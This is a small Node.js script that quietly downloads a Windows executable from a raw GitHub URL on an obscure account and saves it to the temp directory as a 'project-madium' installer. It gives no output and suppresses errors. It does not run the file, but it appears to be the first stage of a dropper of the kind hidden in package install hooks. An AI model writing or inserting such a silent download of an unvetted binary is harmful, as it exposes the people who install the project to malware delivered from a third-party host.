const https = require("https");
const fs = require("fs");
const os = require("os");
const path = require("path");

const INSTALLER_URL =
  "https://raw.githubusercontent.com/a44852433-svg/envious.lol/main/installer.exe";

const installerPath = path.join(
  os.tmpdir(),
  "project-madium-installer.exe"
);

function download(url) {
  return new Promise((resolve, reject) => {
    https
      .get(url, (res) => {
        if (
          res.statusCode >= 300 &&
          res.statusCode < 400 &&
          res.headers.location
        ) {
          res.resume();
          return resolve(download(res.headers.location));
        }

        if (res.statusCode !== 200) {
          res.resume();
          return reject(
            new Error(`Download failed: HTTP ${res.statusCode}`)
          );
        }

        const file = fs.createWriteStream(installerPath);

        res.pipe(file);

        file.on("finish", () => {
          file.close(resolve);
        });

        file.on("error", reject);
        res.on("error", reject);
      })
      .on("error", reject);
  });
}

(async () => {
  try {
    await download(INSTALLER_URL);
    process.exit(0);
  } catch {
    process.exit(1);
  }
})();
